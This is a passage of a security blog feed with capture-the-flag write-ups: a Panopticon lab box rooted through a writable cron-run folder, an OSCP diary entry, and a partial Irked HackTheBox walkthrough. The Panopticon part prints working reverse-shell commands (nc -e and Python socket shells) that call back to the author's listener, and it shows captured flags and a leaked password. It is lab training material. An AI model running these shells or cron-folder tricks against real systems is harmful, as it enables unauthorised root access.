+&lt;pre&gt;&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ cat dev.txt 
+Hello Seer !! You are the only script developper in this departement ... Like I said you , please drop here all your scripts maybe they can make my life easier :)
+
+Brenda&amp;amp;
+&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ 
+&lt;/pre&gt;
+
+&lt;p&gt;So to summarize what I’ve found. There looks to be a cronjob running which runs a hidden file called .lol.sh of which I am not able to read. There is a file telling me that any scripts I drop into the /home/seer/dev_departement folder will be run.&lt;/p&gt;
+
+&lt;p&gt;This was where I was stuck for a few hours as I looked through the mail file and found a lot of references to a hidden file called .update.sh&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/.update.sh &lt;br /&gt;&lt;br /&gt;From: root@panopticon.panopticon (Cron Daemon) To: root@panopticon.panopticon Subject: Cron &amp;lt;root@Panopticon&amp;gt; /home/seer/update.sh MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: &amp;lt;SHELL=/bin/sh&amp;gt; X-Cron-Env: &amp;lt;HOME=/root&amp;gt; X-Cron-Env: &amp;lt;PATH=/usr/bin:/bin&amp;gt; X-Cron-Env: &amp;lt;LOGNAME=root&amp;gt; Message-Id: &amp;lt;E1epgcw-0000CA-BA@Panopticon.Panopticon&amp;gt; Date: Sat, 24 Feb 2018 21:41:02 +0100 &lt;/pre&gt;
+
+&lt;p&gt;I thought that 1) the script had to be hidden and called update.sh and 2) that the script had to be a bash file while also being saved in seer’s home directory rather than the dev one.&lt;/p&gt;
+
+&lt;p&gt;After creating a .sh file with&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;nc -e /bin/sh 10.253.0.255 443 &lt;/pre&gt;
+
+&lt;p&gt;inside and starting a listener at my end, nothing was coming back. The script was not being run. I went back and forth moving the file to different locations, using different ports, getting the script to wget from my webserver to see if it was running it at all – nothing! Even confirming that the script was executable.&lt;/p&gt;
+
+&lt;p&gt;I reviewed the mail file again and seen this beauty – highlighted below&lt;/p&gt;
+
+&lt;pre&gt;From: root@panopticon.panopticon (Cron Daemon)
+To: root@panopticon.panopticon
+Subject: Cron &amp;lt;root@Panopticon&amp;gt; &amp;lt;mark&amp;gt; for f in /home/seer/dev_departement/*.py ; do  /usr/bin/python3 &quot;$f&quot; done &amp;lt;/mark&amp;gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: &amp;lt;SHELL=/bin/sh&amp;gt;
+X-Cron-Env: &amp;lt;HOME=/root&amp;gt;
+X-Cron-Env: &amp;lt;PATH=/usr/bin:/bin&amp;gt;
+X-Cron-Env: &amp;lt;LOGNAME=root&amp;gt;
+Message-Id: &amp;lt;E1fY9gM-0000EM-02@Panopticon.Panopticon&amp;gt;
+Date: Wed, 27 Jun 2018 14:36:22 +0200
+&lt;/pre&gt;
+
+&lt;p&gt;The script had to be a python script.&lt;/p&gt;
+
+&lt;p&gt;I tried using the following script but it didnt work, probably because it needed to be python3&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ cat script.py 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.253.0.255&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ 
+&lt;/pre&gt;
+
+&lt;p&gt;I created a different python script&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;font color=&quot;#34E2E2&quot;&gt;&lt;b&gt;import&lt;/b&gt;&lt;/font&gt; socket
+&lt;font color=&quot;#34E2E2&quot;&gt;&lt;b&gt;import&lt;/b&gt;&lt;/font&gt; subprocess
+s=socket.socket()
+s.connect((&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;&quot;10.253.0.255&quot;&lt;/b&gt;&lt;/font&gt;,443))
+&lt;font color=&quot;#34E2E2&quot;&gt;&lt;b&gt;while&lt;/b&gt;&lt;/font&gt; True:
+     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     s.send(proc.stdout.read() + proc.stderr.read())
+&lt;/pre&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;seer@Panopticon&lt;/b&gt;&lt;/font&gt;:&lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;~/dev_departement&lt;/b&gt;&lt;/font&gt;$ ls -la
+total 16
+drwxrwxrwx 2 root root 4096 Dec  2 13:14 &lt;span style=&quot;background-color:#4E9A06&quot;&gt;&lt;font color=&quot;#3465A4&quot;&gt;.&lt;/font&gt;&lt;/span&gt;
+drwxr-xr-x 7 seer seer 4096 Jun 27 14:17 &lt;font color=&quot;#729FCF&quot;&gt;&lt;b&gt;..&lt;/b&gt;&lt;/font&gt;
+-rw-r--r-- 1 root root  172 Jun 17 17:34 dev.txt
+-rwxr-xr-x 1 seer seer  273 Dec  2 13:02 &lt;font color=&quot;#8AE234&quot;&gt;&lt;b&gt;script.py&lt;/b&gt;&lt;/font&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;Started a listener on my machine and got a connection back.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;⚡  ~/Desktop/panopticon  nc -lnvp 443  
+listening on [any] 443 ...
+connect to [10.253.0.255] from (UNKNOWN) [10.1.1.34] 33634
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+8b470f864495744fcd8c3dc7b370e889
+&lt;/pre&gt;
+
+&lt;p&gt;I wanted to see what was in the .lol.sh&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;cat /var/tmp/.lol.sh
+cd /home/seer/dev_departement 
+for f in *.py; do  # or wget-*.sh instead of *.sh
+  python3 &quot;$f&quot;   || break # if needed 
+done
+&lt;/pre&gt;
+
+&lt;p&gt;And there’s the code that ran the python script in.&lt;/p&gt;
+
+&lt;p&gt;So this was a nice easy box to start with and I’m looking forward to exploring the other boxes that wizard labs have.&lt;/p&gt;</content><author><name>rowbot</name></author><summary type="html">https://labs.wizard-security.net</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2019/04/pano-192x250.png" /></entry><entry><title type="html">OSCP Journey Part 13</title><link href="http://0.0.0.0:4000/2019/01/25/oscp-journey-part-13/" rel="alternate" type="text/html" title="OSCP Journey Part 13" /><published>2019-01-25T11:18:53+00:00</published><updated>2019-01-25T11:18:53+00:00</updated><id>http://0.0.0.0:4000/2019/01/25/oscp-journey-part-13</id><content type="html" xml:base="http://0.0.0.0:4000/2019/01/25/oscp-journey-part-13/">&lt;pre class=&quot;wp-block-preformatted&quot;&gt;Day: 10&lt;br /&gt;PDF: 50%&lt;br /&gt;Videos: 50%&lt;br /&gt;Boxes: ALICE&lt;br /&gt;Networks:1&lt;/pre&gt;
+
+&lt;hr class=&quot;wp-block-separator&quot; /&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;alignleft is-resized&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Poor-Posture_100154.png?resize=202%2C202&quot; alt=&quot;&quot; class=&quot;wp-image-597&quot; width=&quot;202&quot; height=&quot;202&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Poor-Posture_100154.png?w=512 512w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Poor-Posture_100154.png?resize=150%2C150 150w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Poor-Posture_100154.png?resize=300%2C300 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Poor-Posture_100154.png?resize=500%2C500 500w&quot; sizes=&quot;(max-width: 202px) 100vw, 202px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We’ll I’m back in the labs after a few months off. I took a good 2 months off hacking and the last month I subscribed to &lt;a href=&quot;http://virtualhackinglabs.com&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; aria-label=&quot;virtualhackinglabs.com (opens in a new tab)&quot;&gt;virtualhackinglabs.com&lt;/a&gt; for one month. Their PDF is very good.&lt;/p&gt;
+
+&lt;p&gt;In my time off I have been improving my notes &lt;a href=&quot;http:// guide.offsecnewbie.com&quot;&gt;guide.offsecnewbie.com.&lt;/a&gt; I did a few hackthebox machines and worked on &lt;a href=&quot;https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; aria-label=&quot;customising my terminal (opens in a new tab)&quot;&gt;customising my terminal&lt;/a&gt; to make some things easier.&lt;/p&gt;
+
+&lt;p&gt;In my previous attempt I skimmed over the exercises. This time I’m ensuring I do them all and understand them – as best I can.&lt;/p&gt;
+
+&lt;p&gt;I put off the Buffer Overflow exercises last time as I couldn’t get my head around it. This time – as of last night I completed the SLmail and the VulnServer exercises! Very chuffed with myself! I took a day off work and put in about 12 hours to make notes on it and complete the exercises.&lt;/p&gt;
+
+&lt;p&gt;Reading over the notes I had taken for the boxes that I had rooted has revealed that my notes are terrible! If I was to submit a lab report or exam report the way I had taken notes I would have not have passed! An important lesson learned there.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;alignright is-resized&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Conflict_386113.png?resize=193%2C193&quot; alt=&quot;&quot; class=&quot;wp-image-604&quot; width=&quot;193&quot; height=&quot;193&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Conflict_386113.png?w=512 512w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Conflict_386113.png?resize=150%2C150 150w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Conflict_386113.png?resize=300%2C300 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/01/noun_Conflict_386113.png?resize=500%2C500 500w&quot; sizes=&quot;(max-width: 193px) 100vw, 193px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I’m on the OSCP and VHL discord groups so feel free to drop me a message if you want to bounce some ideas off of me. Be aware that my time zone is UK so I’d appreciate no messages at 3am&lt;/p&gt;</content><author><name>rowbot</name></author><summary type="html">Day: 10PDF: 50%Videos: 50%Boxes: ALICENetworks:1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2018/06/perfexion_logo.png" /></entry><entry><title type="html">Pentesting Guide</title><link href="http://0.0.0.0:4000/2018/12/05/pentesting-guide/" rel="alternate" type="text/html" title="Pentesting Guide" /><published>2018-12-05T16:33:52+00:00</published><updated>2018-12-05T16:33:52+00:00</updated><id>http://0.0.0.0:4000/2018/12/05/pentesting-guide</id><content type="html" xml:base="http://0.0.0.0:4000/2018/12/05/pentesting-guide/">&lt;p&gt;Here are my notes that I use when hacking&lt;figure class=&quot;wp-block-embed is-type-rich is-provider-embed-handler&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-embed__wrapper&quot;&gt;
+  https://guide.offsecnewbie.com
+&lt;/div&gt;
+&lt;p&gt;&amp;lt;/figure&amp;gt;&lt;/p&gt;</content><author><name>rowbot</name></author><summary type="html">Here are my notes that I use when hacking</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2018/12/noun_Robo-Advisor_1738104-500x250.png" /></entry><entry><title type="html">Irked – HacktheBox</title><link href="http://0.0.0.0:4000/2018/11/27/irked-hackthebox/" rel="alternate" type="text/html" title="Irked &amp;#8211; HacktheBox" /><published>2018-11-27T11:36:21+00:00</published><updated>2018-11-27T11:36:21+00:00</updated><id>http://0.0.0.0:4000/2018/11/27/irked-hackthebox</id><content type="html" xml:base="http://0.0.0.0:4000/2018/11/27/irked-hackthebox/">&lt;p&gt;I learned about SUID with this box. The user access I found easy, I think I got user in under 10 minutes – that’s a first for me. The PE part took me sometime, which a few nudges!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Skills Required&lt;/strong&gt;&lt;br /&gt;
+SUID knowledge&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Skills Learned&lt;/strong&gt;&lt;br /&gt;
+Searching for sticky bits&lt;br /&gt;
+Understanding a bit more about standard linux binaries&lt;br /&gt;
+Adding echo command to a file to see if it executes it.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;START&lt;br /&gt;&lt;/pre&gt;
+
+&lt;p&gt;nmap -sC -sV -oA all -vv -p- 10.10.10.117&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-41-00.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-528&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-41-00.png?w=938 938w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-41-00.png?resize=300%2C125 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-27-09-41-00.png?resize=768%2C320 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;figcaption&amp;gt;nmap imported into pentest.ws&amp;lt;/figcaption&amp;gt;&amp;lt;/figure&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;I see that there is an IRC server and take took a look for a metasploit module.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?fit=680%2C139&quot; alt=&quot;&quot; class=&quot;wp-image-493&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?w=1571 1571w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?resize=300%2C61 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?resize=768%2C157 768w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?resize=1024%2C209 1024w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-23-44.png?w=1360 1360w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt; &lt;figcaption&gt;metasploit search on pentest.ws&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-27-59.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-497&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-27-59.png?w=589 589w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-27-59.png?resize=300%2C172 300w&quot; sizes=&quot;(max-width: 589px) 100vw, 589px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;set RHOST and RPORT&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-29-53.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-500&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-29-53.png?w=941 941w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-29-53.png?resize=300%2C125 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-29-53.png?resize=768%2C321 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;have shell as ircd &amp;#8211; need to upgrade shell.&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-30-47.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-501&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-30-47.png?w=361 361w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-30-47.png?resize=277%2C300 277w&quot; sizes=&quot;(max-width: 361px) 100vw, 361px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;I chose python 2&amp;nbsp; and upgraded to a better shell&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;After upgrading the shell I browsed to the home directory to see what users there were. I seen there was ircd – which I was logged in as and djmardov. Traversing into the djmardov user there were a few files – laid out in the Windows style&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;ircd@irked:/home/djmardov$ ls &lt;br /&gt;ls &lt;br /&gt;Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos&lt;br /&gt;ircd@irked:/home/djmardov$ &lt;/pre&gt;
+
+&lt;p&gt;I ran ls -laR to search for files within all the directories in djmardov and found the user.txt file as well as another hidden file called .&lt;em&gt;backup&lt;/em&gt;.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-37-47.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-502&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-37-47.png?w=536 536w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-37-47.png?resize=300%2C228 300w&quot; sizes=&quot;(max-width: 536px) 100vw, 536px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+
+&lt;p&gt;I tried to view user.txt but couldnt – I’m not the user djmardov.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;ircd@irked:/home/djmardov/Documents$ cat user.txt&lt;br /&gt;cat user.txt&lt;br /&gt;cat: user.txt: Permission denied&lt;br /&gt;ircd@irked:/home/djmardov/Documents$ &lt;/pre&gt;
+
+&lt;p&gt;I checked to see what was in the contents of .backup.txt&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;ircd@irked:/home/djmardov/Documents$ cat .backup&lt;br /&gt;cat .backup&lt;br /&gt;Super elite steg backup pw&lt;br /&gt;UPupDOWNdownLRlrBAbaSSss&lt;/pre&gt;
+
+&lt;p&gt;Humm so I have a steg password for something – probably an image.&lt;/p&gt;
+
+&lt;p&gt;Back to review the nmap scan and see there is a http server.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-53.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-505&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-53.png?w=786 786w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-53.png?resize=300%2C15 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-53.png?resize=768%2C37 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+
+&lt;p&gt;It reveals an image – I guessed that this is the image that the steg password is for.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-25.png?fit=680%2C471&quot; alt=&quot;&quot; class=&quot;wp-image-506&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-25.png?w=1033 1033w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-25.png?resize=300%2C208 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-25.png?resize=768%2C532 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-42-25.png?resize=1024%2C709 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt; &lt;figcaption&gt;image on homepage&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;I downloaded the image to kali&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-45-49.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-507&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-45-49.png?w=583 583w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-45-49.png?resize=300%2C116 300w&quot; sizes=&quot;(max-width: 583px) 100vw, 583px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;I notice that the file name is irked &amp;#8211; adding to my suspicions that this is the image that i need to decode&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;For some reason steghide is not installed by default in Kali so I did an apt-get install steghide to install it. Following the help page of it I extracted the data from the file as shown below.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-50-03.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-508&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-50-03.png?w=660 660w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-50-03.png?resize=300%2C60 300w&quot; sizes=&quot;(max-width: 660px) 100vw, 660px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;figcaption&gt;captured another password &amp;#8211; probably for the user djmardov&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-45-19.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-525&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-45-19.png?w=803 803w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-45-19.png?resize=300%2C37 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-45-19.png?resize=768%2C95 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;added creds to pentest.ws&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;p&gt;I ssh’d in as dj&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-51-39.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-509&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-51-39.png?w=668 668w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-16-51-39.png?resize=300%2C110 300w&quot; sizes=&quot;(max-width: 668px) 100vw, 668px&quot; data-recalc-dims=&quot;1&quot; /&gt; &lt;/figure&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;djmardov@irked:~$ cat Documents/user.txt &lt;br /&gt;4a66a78b12dc0e661a59d3f5c0267a8e&lt;br /&gt;djmardov@irked:~$ &lt;/pre&gt;
+
+&lt;p&gt;The PE part took me a lot of time and I needed a few nudges. I’ll go through some my thoughts, some commands I used and what I was looking for.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;djmardov@irked:/tmp$ sudo -l&lt;br /&gt;-bash: sudo: command not found&lt;br /&gt;djmardov@irked:/tmp$ &lt;/pre&gt;
+
+&lt;p&gt;Test to see what sudo command djmardov can run. He has not been given access to sudo. Sometimes you get lucky with this PE route.&lt;/p&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;
+
+&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-14-42.png?fit=680%2C237&quot; alt=&quot;&quot; class=&quot;wp-image-517&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-14-42.png?w=1028 1028w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-14-42.png?resize=300%2C104 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-14-42.png?resize=768%2C267 768w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-14-42.png?resize=1024%2C357 1024w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt; &lt;figcaption&gt;nothing of note running as root&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-30-12.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-518&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-30-12.png?w=806 806w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-30-12.png?resize=300%2C31 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/11/Screenshot-from-2018-11-26-20-30-12.png?resize=768%2C80 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;figcaption&gt;`What is the server's Architecture 